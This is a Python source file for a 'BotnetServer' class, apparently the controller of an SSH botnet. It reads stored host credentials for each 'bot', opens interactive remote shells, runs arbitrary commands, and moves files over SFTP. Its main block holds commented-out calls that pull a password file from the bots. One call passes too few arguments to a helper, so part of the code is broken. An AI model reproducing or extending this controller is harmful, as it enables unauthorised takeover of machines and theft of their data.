import re
from typing import Any, List
import paramiko
from pexpect import pxssh

from connections import Connections
from dao import SelectBotDao
from dataclasses import dataclass
from .server_interface import ServerInterface
from threading import Thread
from multiprocessing import Process


@dataclass
class BotnetServer(ServerInterface):
    __global_conn: Any = None
    __conn: Connections = Connections()
    __bots: SelectBotDao = SelectBotDao()

    def get_bot(self, **kwargs) -> object:
        return self.__bots.select_one(**kwargs)

    def get_all_bots(self) -> 'collections.Iterable':
        for bott in self.__bots.select():
            yield bott

    def upload_files(self,
                     *file_path: str,
                     user: str,
                     host: str,
                     pw: str) -> None:
        assert len(file_path) <= 2, "origin path and remote path , only"
        print(file_path)
        transport = paramiko.Transport((host, 22))
        transport.connect(username=user, password=pw)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(file_path[0], file_path[1])
        sftp.close()
        transport.close()
        print("Sent")

    def download_files(self,
                       *file_path: str,
                       user: str,
                       host: str,
                       pw: str) -> None:
        assert len(file_path) <= 2, "origin path and remote path , only"
        print(file_path)
        transport = paramiko.Transport((host, 22))
        transport.connect(username=user, password=pw)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.get(file_path[1], file_path[0])
        sftp.close()
        transport.close()
        print("Downloaded")

    def __commands(self, conn):
        while True:
            command: str = input(">>> [type 'exit' to finish]: ")
            if command == "exit":
                conn.logout()
                break
            conn.sendline(command)  # send the command
            conn.prompt()
            parse = re.sub(r'\x1b\[(0;)?\d{1,2}(;\d{1,2})?(m|\x1b\[K|\r\n|\x1b\[?2004hls\x1b\[?2004l\r)',
                           '',
                           conn.before.decode('utf-8').strip())  # get result
            parse = re.sub(r'\x1b\[?2004h',
                           '',
                           parse.strip())
            print(parse.strip().replace(command, ''))

    def get_shell(self,
                  host: str,
                  user: str,
                  password: str,
                  option: int) -> None:
        """
        allow to navigate into remote machine
        :param host:
        :param user:
        :param password:
        :param option: how much bots
        :return:
        """

        if option == 1:
            with self.__conn.connection_ssh(host=host,
                                            user=user,
                                            password=password) as conn:
                self.__commands(conn)

        else:
            self.__client(
                           host,
                           user,
                           password
                       )

    def __client(self, host: str, user: str, password: str, command: str) -> None:
        print(host, user, password)
        ssh = pxssh.pxssh()
        ssh.login(host, user, password)
        ssh.sendline(command)
        ssh.prompt()
        print(f"response: {ssh.before.decode('utf-8')}")
        ssh.logout()

    def general_controller(self,
                           host: str,
                           user: str,
                           password: str,
                           option: int) -> None:
        with self.__conn.connection_ssh(host=host,
                                        user=user,
                                        password=password) as conn:
            self.__global_conn = conn


if __name__ == '__main__':
    bs: BotnetServer = BotnetServer()
    bots: List[Thread] = []
    for bot in bs.get_all_bots():
        print(f"Connecting to bot {bot}")
        bsx0: BotnetServer = BotnetServer()
        """t = Thread(target=bsx0.get_shell, args=(bot.host,
                              bot.username,
                              bot.password,
                              4))"""
        #t.start()
        #bots.append(t)
        """bs.get_shell(bot.host,
                             bot.username,
                             bot.password, 1)"""
        """bsx0.general_controller(bot.host,
                              bot.username,
                              bot.password,
                              4)"""
        """bs.upload_files(r".",
                        r"/home/marcus/Documents/password.txt",
                        host=bot.host,
                        user=bot.username,
                        pw=bot.password)"""
        """bs.download_files(r"/home/marcus/password_download.txt",
                        r"/home/marcus/Documents/password.txt",
                        host=bot.host,
                        user=bot.username,
                        pw=bot.password)"""
    # [bot.join() for bot in bots]

    #  print(bs.get_bot(id=1))
    #  print(bs.get_bot(user='marcus'))
